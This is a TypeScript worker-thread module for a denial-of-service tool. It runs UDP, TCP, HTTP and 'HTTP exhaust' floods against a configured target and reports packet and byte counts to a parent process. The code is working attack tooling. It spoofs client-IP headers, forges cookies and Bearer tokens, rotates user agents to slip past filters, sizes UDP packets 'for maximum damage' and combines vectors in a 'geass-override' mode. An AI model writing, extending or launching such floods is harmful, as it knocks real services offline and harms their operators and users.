/**
 * ATTACK WORKER — runs in a worker_thread, owns its own event loop
 *
 * Receives attack config via workerData, fires all vectors,
 * and posts stats back to parent every 300ms.
 * Stops when parent sends "stop" message.
 */
import { parentPort, workerData } from "worker_threads";
import net from "node:net";
import dgram from "node:dgram";
import dns from "node:dns/promises";

// ── Types ─────────────────────────────────────────────────────────────────
interface WorkerConfig {
  method:   string;
  target:   string;
  port:     number;
  threads:  number;    // this worker's share of total threads
}

// ── Helpers ───────────────────────────────────────────────────────────────
const randInt  = (a: number, b: number) => a + Math.floor(Math.random() * (b - a));
const randStr  = (n: number) => Math.random().toString(36).slice(2, 2 + n);
const randIp   = () => `${1+randInt(0,223)}.${randInt(0,254)}.${randInt(0,254)}.${1+randInt(0,253)}`;
const randHex  = (n: number) => Array.from({length:n}, () => (Math.random()*16|0).toString(16)).join("");
const UA_POOL  = [
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/125.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4) AppleWebKit/537.36 Chrome/124.0.0.0 Safari/537.36",
  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 Chrome/123.0.0.0 Safari/537.36",
  "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0",
  "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 Safari/604.1",
  "curl/8.7.1", "python-requests/2.32.0", "Go-http-client/2.0",
];
const randUA   = () => UA_POOL[randInt(0, UA_POOL.length)];
const HOT_PATHS = [
  "/", "/search", "/api/", "/api/v1/", "/login", "/admin/",
  "/wp-admin/", "/wp-login.php", "/dashboard", "/graphql",
];
const hotPath = () => HOT_PATHS[randInt(0, HOT_PATHS.length)];

// DNS resolution cache
const dnsCache = new Map<string, string>();
async function resolveHost(hostname: string): Promise<string> {
  if (dnsCache.has(hostname)) return dnsCache.get(hostname)!;
  try {
    const [ip] = await dns.resolve4(hostname);
    dnsCache.set(hostname, ip);
    return ip;
  } catch { return hostname; }
}

// ── Headers builder ───────────────────────────────────────────────────────
function buildHeaders(isPost: boolean, bodyLen?: number): Record<string, string> {
  const cookie = Array.from({length: randInt(6,16)}, () =>
    `${randStr(randInt(4,8))}=${randStr(randInt(16,48))}`
  ).join("; ");

  const h: Record<string, string> = {
    "User-Agent":          randUA(),
    "Accept":              "*/*",
    "Accept-Language":     "en-US,en;q=0.9",
    "Accept-Encoding":     "gzip, deflate, br",
    "Cache-Control":       "no-cache, no-store",
    "Connection":          Math.random() < 0.5 ? "close" : "keep-alive",
    "X-Forwarded-For":     `${randIp()}, ${randIp()}, ${randIp()}`,
    "X-Real-IP":           randIp(),
    "True-Client-IP":      randIp(),
    "CF-Connecting-IP":    randIp(),
    "Cookie":              cookie,
    "Authorization":       `Bearer eyJ${randHex(40)}.eyJ${randHex(60)}.${randHex(40)}`,
    "X-CSRF-Token":        randHex(32),
    "Referer":             `https://google.com/search?q=${randStr(8)}`,
  };
  if (isPost && bodyLen !== undefined) {
    h["Content-Type"] = "application/x-www-form-urlencoded";
    h["Content-Length"] = String(bodyLen);
  }
  return h;
}

function buildUrl(base: string): string {
  try {
    const u = new URL(base);
    if (Math.random() < 0.6) u.pathname = hotPath();
    else {
      const depth = randInt(0, 4);
      if (depth > 0) u.pathname = "/" + Array.from({length:depth}, () => randStr(randInt(3,8))).join("/");
    }
    u.searchParams.set("_", Date.now().toString(36) + randStr(5));
    u.searchParams.set("v", String(randInt(1,9999999)));
    if (Math.random() < 0.4) u.searchParams.set("q", randStr(randInt(4,16)));
    return u.toString();
  } catch {
    return `${base}?_=${randStr(8)}`;
  }
}

function buildBody(minF = 20, maxF = 80): string {
  return Array.from({length: randInt(minF, maxF)},
    () => `${randStr(randInt(4,10))}=${randStr(randInt(8,48))}`
  ).join("&");
}

// Pre-built heavy body pool (built once on worker start, rotated slowly)
const HEAVY_POOL: string[] = [];
function buildHeavy(): string {
  const target = randInt(10240, 49152); // 10-48KB
  const parts: string[] = [];
  let len = 0;
  while (len < target) {
    const p = `${randStr(randInt(4,10))}=${randStr(randInt(40,120))}`;
    parts.push(p);
    len += p.length + 1;
  }
  return parts.join("&");
}
for (let i = 0; i < 20; i++) HEAVY_POOL.push(buildHeavy());
setInterval(() => {
  HEAVY_POOL[randInt(0, HEAVY_POOL.length)] = buildHeavy();
}, 3000);
const getHeavy = () => HEAVY_POOL[randInt(0, HEAVY_POOL.length)];

// ─────────────────────────────────────────────────────────────────────────
//  REAL UDP FLOOD — this is how 50M packets/60s is achieved
//
//  UDP = connectionless = no handshake, no ACK, no response wait
//  dgram.send() is non-blocking, kernel queues packets at wire speed
//
//  Achievable rate: 100K - 2M packets/second per worker
//  (actual limit is NIC bandwidth and kernel socket buffer)
// ─────────────────────────────────────────────────────────────────────────
async function runUDPFlood(
  resolvedHost: string,
  targetPort: number,
  threads: number,
  signal: AbortSignal,
  onStats: (p: number, b: number) => void,
): Promise<void> {
  // Multiple UDP sockets for higher throughput (bypass per-socket kernel limits)
  const numSockets = Math.min(threads, 16);
  const sockets = Array.from({length: numSockets}, () => {
    const s = dgram.createSocket("udp4");
    s.unref(); // don't keep process alive
    return s;
  });

  const PORTS = [targetPort, 53, 80, 443, 123, 161, 1900, 11211];
  const PKT_MIN = 512, PKT_MAX = 1472; // near MTU for maximum damage

  let localPkts = 0, localBytes = 0;
  const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  // UDP launcher — fire-and-forget, no await on send callback
  const udpLauncher = async (sock: dgram.Socket, sockIdx: number) => {
    const itersPerYield = 50; // send 50 UDP packets then yield to event loop
    let iter = 0;
    while (!signal.aborted) {
      const port   = PORTS[Math.floor(Math.random() * PORTS.length)];
      const pktLen = randInt(PKT_MIN, PKT_MAX);
      const buf    = Buffer.allocUnsafe(pktLen);
      // Fill with random-ish data (bypass trivial packet filters)
      buf.writeUInt32LE(randInt(0, 0xFFFFFFFF), 0);
      buf.writeUInt32LE(Date.now(), 4);

      sock.send(buf, port, resolvedHost); // FIRE — no callback, no wait
      localPkts++;
      localBytes += pktLen;

      iter++;
      if (iter >= itersPerYield) {
        iter = 0;
        await Promise.resolve(); // yield to event loop every N packets
      }
    }
    sock.close();
  };

  // Spread sockets across ports evenly
  await Promise.all(sockets.map((s, i) => udpLauncher(s, i)));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  HTTP FLOOD — fire-and-forget within this worker's event loop
// ─────────────────────────────────────────────────────────────────────────
async function runHTTPFlood(
  base: string,
  threads: number,
  signal: AbortSignal,
  onStats: (p: number, b: number) => void,
): Promise<void> {
  const ALL_METHODS = ["GET","GET","GET","POST","POST","POST","HEAD","PUT","DELETE","PATCH","OPTIONS"];
  const MAX_INFLIGHT = Math.min(threads * 12, 2000);
  let inflight = 0;
  let localPkts = 0, localBytes = 0;
  const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const doFetch = () => {
    if (signal.aborted) return;
    inflight++;
    const method   = ALL_METHODS[randInt(0, ALL_METHODS.length)];
    const hasBody  = method === "POST" || method === "PUT" || method === "PATCH";
    const body     = hasBody ? buildBody(30, 100) : undefined;
    const url      = buildUrl(base);
    const headers  = buildHeaders(hasBody, body?.length);

    fetch(url, { method, headers, body, signal: AbortSignal.timeout(3000), redirect: "follow", keepalive: false })
      .then(res => {
        inflight--;
        localPkts++;
        localBytes += (body?.length ?? 0) + (parseInt(res.headers.get("content-length") || "0") || 350) + 400;
        res.body?.cancel().catch(() => {});
      })
      .catch(() => { inflight--; localPkts++; localBytes += 100; });
  };

  const launcher = async () => {
    while (!signal.aborted) {
      if (inflight < MAX_INFLIGHT) { doFetch(); await Promise.resolve(); }
      else await new Promise(r => setTimeout(r, 2));
    }
  };

  await Promise.all(Array.from({length: Math.min(threads, 80)}, () => launcher()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  TCP FLOOD — raw connections
// ─────────────────────────────────────────────────────────────────────────
async function runTCPFlood(
  resolvedHost: string,
  targetPort: number,
  threads: number,
  signal: AbortSignal,
  onStats: (p: number, b: number) => void,
): Promise<void> {
  const PORTS = [targetPort, targetPort === 443 ? 80 : 443, 8080, 8443, 3000, 5000];
  const MAX_INFLIGHT = Math.min(threads * 6, 1500);
  let inflight = 0;
  let localPkts = 0, localBytes = 0;
  const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const doConnect = () => {
    if (signal.aborted) return;
    inflight++;
    const p    = PORTS[randInt(0, PORTS.length)];
    const sock = net.createConnection({ host: resolvedHost, port: p });
    sock.setTimeout(700);
    const kill = setTimeout(() => { sock.destroy(); inflight--; }, 900);
    sock.once("connect", () => {
      localPkts++; localBytes += 60;
      const req = `GET ${hotPath()}?_=${randStr(6)} HTTP/1.1\r\nHost: ${resolvedHost}\r\nConnection: close\r\n\r\n`;
      const junk = Buffer.allocUnsafe(randInt(512, 2048));
      sock.write(Buffer.concat([Buffer.from(req), junk]), () => {
        localBytes += req.length + junk.length;
        clearTimeout(kill); inflight--; sock.destroy();
      });
    });
    sock.once("error",   () => { localPkts++; localBytes += 20; clearTimeout(kill); inflight--; });
    sock.once("timeout", () => { clearTimeout(kill); inflight--; sock.destroy(); });
  };

  const launcher = async () => {
    while (!signal.aborted) {
      if (inflight < MAX_INFLIGHT) { doConnect(); await Promise.resolve(); }
      else await new Promise(r => setTimeout(r, 2));
    }
  };

  await Promise.all(Array.from({length: Math.min(threads, 60)}, () => launcher()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  HTTP EXHAUST — huge bodies
// ─────────────────────────────────────────────────────────────────────────
async function runHTTPExhaust(
  base: string,
  threads: number,
  signal: AbortSignal,
  onStats: (p: number, b: number) => void,
): Promise<void> {
  const PATHS  = ["/upload","/submit","/post","/api/upload","/api/submit","/api/data","/graphql","/form","/register"];
  const METHS  = ["POST","POST","PUT","PATCH","POST"];
  const MAX_INFLIGHT = Math.min(threads * 4, 600);
  let inflight = 0;
  let localPkts = 0, localBytes = 0;
  const flush = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
  const flushIv = setInterval(flush, 300);

  const doFetch = () => {
    if (signal.aborted) return;
    inflight++;
    const method = METHS[randInt(0, METHS.length)];
    const path   = PATHS[randInt(0, PATHS.length)];
    const body   = getHeavy();
    let url: string;
    try { const u = new URL(base); u.pathname = path; u.searchParams.set("_", randStr(6)); url = u.toString(); }
    catch { url = `${base}${path}?_=${randStr(6)}`; }
    const h = buildHeaders(true, body.length);

    fetch(url, { method, headers: h, body, signal: AbortSignal.timeout(5000), keepalive: false })
      .then(res => { inflight--; localPkts++; localBytes += body.length + 300; res.body?.cancel().catch(() => {}); })
      .catch(() => { inflight--; localPkts++; localBytes += 200; });
  };

  const launcher = async () => {
    while (!signal.aborted) {
      if (inflight < MAX_INFLIGHT) { doFetch(); await Promise.resolve(); }
      else await new Promise(r => setTimeout(r, 4));
    }
  };

  await Promise.all(Array.from({length: Math.min(threads, 40)}, () => launcher()));
  clearInterval(flushIv);
  flush();
}

// ─────────────────────────────────────────────────────────────────────────
//  WORKER MAIN — receives config, runs attack, posts stats
// ─────────────────────────────────────────────────────────────────────────
const cfg = workerData as WorkerConfig;

const ctrl = new AbortController();
parentPort?.on("message", (msg) => {
  if (msg === "stop") ctrl.abort();
});

// Resolve host for TCP/UDP vectors
let hostname = cfg.target;
let targetPort = cfg.port || 80;
try {
  const u = new URL(/^https?:\/\//i.test(cfg.target) ? cfg.target : `http://${cfg.target}`);
  hostname   = u.hostname;
  targetPort = parseInt(u.port, 10) || (u.protocol === "https:" ? 443 : 80);
} catch { /* keep raw */ }

const base  = /^https?:\/\//i.test(cfg.target) ? cfg.target : `http://${cfg.target}`;
const onStats = (p: number, b: number) => { parentPort?.postMessage({ pkts: p, bytes: b }); };

// Run correct attack
resolveHost(hostname).then(resolvedHost => {
  const L4 = new Set(["syn-flood","tcp-flood","tcp-ack","tcp-rst"]);
  const UDP = new Set(["udp-flood","udp-bypass","icmp-flood","dns-amp","ntp-amp","ssdp-amp","mem-amp"]);

  if (UDP.has(cfg.method)) {
    return runUDPFlood(resolvedHost, targetPort, cfg.threads, ctrl.signal, onStats);
  } else if (L4.has(cfg.method)) {
    return runTCPFlood(resolvedHost, targetPort, cfg.threads, ctrl.signal, onStats);
  } else if (cfg.method === "geass-override") {
    // Triple vector — split threads across 3 sub-attacks
    const httpT    = Math.ceil(cfg.threads * 0.45);
    const tcpT     = Math.ceil(cfg.threads * 0.30);
    const exhaustT = Math.ceil(cfg.threads * 0.25);
    return Promise.all([
      runHTTPFlood(base,    httpT,    ctrl.signal, onStats),
      runTCPFlood(resolvedHost, targetPort, tcpT, ctrl.signal, onStats),
      runHTTPExhaust(base,  exhaustT, ctrl.signal, onStats),
    ]).then(() => {});
  } else {
    // HTTP methods (http-flood, http-bypass, http2-flood, slowloris, rudy)
    return runHTTPFlood(base, cfg.threads, ctrl.signal, onStats);
  }
}).then(() => {
  parentPort?.postMessage({ done: true });
});
